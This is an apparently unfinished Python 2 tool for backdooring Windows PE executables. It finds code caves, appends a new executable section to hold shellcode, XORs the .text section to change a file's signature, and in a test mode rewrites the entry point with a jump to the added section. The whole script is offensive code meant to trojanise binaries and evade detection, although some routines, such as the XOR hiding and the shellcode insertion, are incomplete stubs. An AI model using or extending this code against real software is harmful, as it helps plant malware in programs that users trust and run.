#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add new section to put shellcode into
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
from binascii import hexlify, unhexlify # remove
import sys
import os
import random
import string
import struct
try:
    import pefile
    import argparse
    #from pwn import disasm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Load PE file
def load_pe_file(filename):
    if os.path.isfile(filename):
        print "\n[*] Loading PE file => \"%s\"" % (filename)
        try:
            return pefile.PE(filename)
        except pefile.PEFormatError:
            print "[!] File (%s) doesn't seem to be a PE file" % (filename)
            sys.exit(1)
    else:
        print "\n[!] File (%s) doesn't exist" % (filename)
        sys.exit(1)

# Write new PE file
def write_PE_file(pe_struct, out_filename):
    print "\n[*] Writing new PE file => \"%s\"" % (out_filename)
    pe_struct.write(filename=out_filename)

# Go through all PE sections (and display them)
def iterate_trough_pe_sections(pe_struct):
    print " - PE sections - %d section(s)" % (pe_struct.FILE_HEADER.NumberOfSections)
    print "\t\tVOffset\tVSize\tSize\t\tName"
    print "\t\t-----------------------------------------------------"
    for section in pe_struct.sections:
        print "\t\t%s\t%s\t%s\t\t%s" % (hex(section.VirtualAddress), hex(section.Misc_VirtualSize), hex(section.SizeOfRawData), section.Name)

# Dump opcodes from PE, and display ASM
def dump_data(pe, address, size):
    blob =  pe.get_data(address, size)
    for l in disasm(blob, arch="i386").split("\n"):
        print "\t%s" % (l)

# Perform a quick analysis of PE file
def pe_analysis(pe_struct):
    print "\n[*] Analysis"
    # Entry Point
    print " - Entry point: 0x%x" % (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)
    # ASLR
    if (pe_struct.OPTIONAL_HEADER.DllCharacteristics & 0x0040):
        print " - ASLR is enabled"
    else:
        print " - ASLR is disabled"
    # Sections
    iterate_trough_pe_sections(pe_struct)
    # Requires pwntools
    #print "\n - ASM instructions @entry point"
    #dump_data(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)

# Look for code cave inside PE file's sections
def find_code_cave(pe_struct, min_size=100):
    print "[*] Looking for code caves"
    for section in pe_struct.sections:
        print "\t- Section: %s" % (section.Name)
        current_size = 0
        n = 0
        current_address = ""
        for d in section.get_data():
            if d == "\x00":
                current_size += 1
                current_address = section.VirtualAddress
            else:
                if current_size >= min_size:
                    #print hex(section.PointerToRawData + n - current_size)
                    print "\t-> Found a code cave: %d bytes, starting @%s" % (current_size, hex(current_address))
                current_size = 0
                current_address = ""
            n+=1

def adjust_optional_header(pe_struct):
    pe_struct.OPTIONAL_HEADER.SizeOfImage = pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize
    pe_struct.OPTIONAL_HEADER.SizeOfCode = 0
    pe_struct.OPTIONAL_HEADER.SizeOfInitializedData = 0
    pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData = 0

    for section in pe_struct.sections:
        if section.Characteristics & 0x00000020:
            pe_struct.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
        if section.Characteristics & 0x00000040:
            pe_struct.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
        if section.Characteristics & 0x00000080:
            pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    return pe_struct

def create_new_section(pe_struct, sectionName = ".NewSec", virtualSize = 0x1000, pattern = "\x00", flags = 0xE00000E0):
    print "\n[*] Creating new section (\"%s\")" % (sectionName)

    # File alignment
    alignment = pe_struct.OPTIONAL_HEADER.FileAlignment
    # Section alignment
    SectionAlignment = pe_struct.OPTIONAL_HEADER.SectionAlignment
    # Get latest section
    latest_section = pe_struct.sections[-1]

    data = (virtualSize/2) * "\x00\x01"
    offset_for_new_section = hex(latest_section.VirtualAddress + latest_section.SizeOfRawData)

    print " - Append %d bytes to PE file" % (virtualSize)

    # Append data to file
    full_length = latest_section.PointerToRawData + latest_section.SizeOfRawData
    pe_struct.__data__ = pe_struct.__data__[:full_length] + data

    # Find correct offset (with section alignment)
    virtualAddress = (pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize - (pe_struct.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)

    # Add data (of the section header) to the file
    # 0x28 size of section header
    section_table_offset = pe_struct.DOS_HEADER.e_lfanew + 4 + pe_struct.FILE_HEADER.sizeof() + pe_struct.FILE_HEADER.SizeOfOptionalHeader
    section_offset = section_table_offset + pe_struct.FILE_HEADER.NumberOfSections * 0x28

    # Add data of the new section header to PE file
    pe_struct.set_bytes_at_offset(section_offset, sectionName)              # Name of new section
    pe_struct.set_dword_at_offset(section_offset + 0x08, virtualSize)       # virtualSize
    pe_struct.set_dword_at_offset(section_offset + 0x0C, virtualAddress)    # virtualAddress
    pe_struct.set_dword_at_offset(section_offset + 0x10, virtualSize)       # RawSize
    pe_struct.set_dword_at_offset(section_offset + 0x14, full_length)       # RawAddress
    pe_struct.set_dword_at_offset(section_offset + 0x18, 0x00000000)        # RelocAddress
    pe_struct.set_dword_at_offset(section_offset + 0x1C, 0x00000000)        # LineNumbers
    pe_struct.set_word_at_offset(section_offset + 0x20, 0x0000)             # RelocationsNumber
    pe_struct.set_word_at_offset(section_offset + 0x22, 0x0000)             # LinenumbersNumber
    pe_struct.set_dword_at_offset(section_offset + 0x24, flags)             # Flags

    # Add (+1) new section
    pe_struct.FILE_HEADER.NumberOfSections +=1

    pe_struct.parse_sections(section_table_offset) # Fetch the PE file sections
    pe_struct = adjust_optional_header(pe_struct)

    return pe_struct

def xor_section(pe_struct):
    for section in pe_struct.sections:
        if ".text" in section.Name:
            result = ""
            for b in section.get_data():
                result += chr(ord(b)^0xe0)
            print len(result)

    # unXOR ASM routine
    # MOV EAX, 0x00000000
    # XOR BYTE PTR DS:[EAX], 0A
    # INC EAX
    # CMP EAX, 0x00000000
    # JLE SHORT 0x00000000
    # PUSH EBP
    # MOV EBP, ESP
    # PUSH -1
    # JMP 0x00000000

# Args parser
def parser():
    parser = argparse.ArgumentParser(description="Add a shellcode to an existing PE (x86) or hide the content of a PE")
    parser.add_argument('--file', '-f', required=True, help="PE file to work with")
    parser.add_argument('--analyse', required=False, action="store_true", help="Analyse PE file (sections, entry point, etc.)")
    parser.add_argument('--fcc', required=False, action="store_true", help="Find code cave to put shellcode into (technique 1)")
    parser.add_argument('--new-sec', required=False, metavar="", help="Add shellcode into new PE section (technique 2)")
    parser.add_argument('--shellcode', required=False, metavar="FILE", help="Shellcode to be added to PE file")
    parser.add_argument('--new-sec-name', required=False, metavar="", help="New section name (5 chars max), otherwise will be randomly generated")
    parser.add_argument('--hide', required=False, metavar="FILE", help="Changes current PE's signature (techniques: xor)")
    parser.add_argument('--output', required=False, metavar="FILE", help="Output (PE) file")
    parser.add_argument('--test', required=False, action="store_true", help="test")
    return parser.parse_args()

if __name__ == "__main__":
    args = parser()

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)

    if (args.analyse): # Look for code cave
        pe_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.hide):
        if args.hide == "xor":
            xor_section(pe_struct)
    elif (args.shellcode):
        # New section name
        new_section_name = ".%s" % (''.join(random.choice(string.ascii_letters) for x in range(5)))
        if args.new_sec_name is not None:
            if len(args.new_sec_name) > 0 and len(args.new_sec_name) <= 5:
                if (args.new_sec_name[0] != "."):
                    new_section_name = ".%s" % (args.new_sec_name)
                else:
                    new_section_name = "%s" % (args.new_sec_name)

        new_pe_file = create_new_section(pe_struct, sectionName=new_section_name)
        iterate_trough_pe_sections(pe_struct)
        write_PE_file(new_pe_file, args.output)

    elif (args.test):

        new_pe_file = create_new_section(pe_struct, sectionName=".zeubi")
        iterate_trough_pe_sections(new_pe_file)

        latest_section = new_pe_file.sections[-1]


        jmp_addr = latest_section.VirtualAddress - new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - 1
        #print hex(jmp_addr)
        jmp_addr_r = struct.pack("<I", jmp_addr)
        #print hexlify(jmp_addr_r)

        # relative JMP
        jmp_shellcode = b"\xE9" + jmp_addr_r
        print jmp_shellcode
        # Change code @ entry point
        new_pe_file.set_bytes_at_rva(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint, jmp_shellcode)

        write_PE_file(new_pe_file, "zeubi.exe")
